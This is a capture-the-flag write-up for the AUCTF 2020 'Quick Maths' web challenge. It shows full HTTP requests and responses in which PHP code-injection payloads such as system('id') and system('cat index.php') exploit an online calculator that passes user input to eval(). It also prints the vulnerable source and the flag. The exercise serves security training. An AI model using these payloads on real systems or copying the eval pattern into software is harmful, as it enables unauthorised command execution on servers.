# AUCTF 2020 – Quick Maths

* **Category:** web
* **Points:** 50

## Challenge

> http://challenges.auctf.com:30021
> 
> two plus two is four minus three that's one quick maths
> 
> Author: shinigami

## Solution

The website is an on-line calculator.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=1%2B1

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:22:19 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 332
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>2</div>

</body>
</html>
```

You can easily trigger an error and discover that it uses PHP `eval()`.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement={{}}

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:23:17 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 440
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2><br />
<b>Parse error</b>:  syntax error, unexpected '{' in <b>/var/www/html/index.php(5) : eval()'d code</b> on line <b>1</b><br />
```

So you can use PHP `system()` function to execute commands.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('id')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:23:53 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 438


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>

</body>
</html>
```

You can list the directory.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('ls -al')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:26:23 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 560


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>total 16
drwxr-xr-x 1 www-data www-data 4096 Apr  3 19:24 .
drwxr-xr-x 1 root     root     4096 Dec 29  2018 ..
-rwxr-xr-x 1 root     root      560 Mar 31 19:34 index.php
-rwxr-xr-x 1 root     root      560 Mar 31 19:34 index.php</div>

</body>
</html>
```

And print the `index.php` file to discover the flag.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('cat index.php')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:27:06 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 898


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2><?php
function evaluate(){
	$in = "echo " . $_POST['statement'] . ";";
	$flag = "auctf{p6p_1nj3c7i0n_iz_k3wl}";
	$value = eval($in);
	return $value;
}

?>

<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="" method="post">
<center><h3>Input your expression</h3></center></br>
<center><input type="text" name="statement" /></center>
<center><input type="submit"/><center>
</form>
</br>
</br>
<div>
<?php
if (isset($_POST['statement'])){
		echo "<h2>Result</h2>";
		echo evaluate();
}
?>
</div>

</body>
</html>
</html></div>

</body>
</html>
```

The flag is the following.

```
auctf{p6p_1nj3c7i0n_iz_k3wl}
```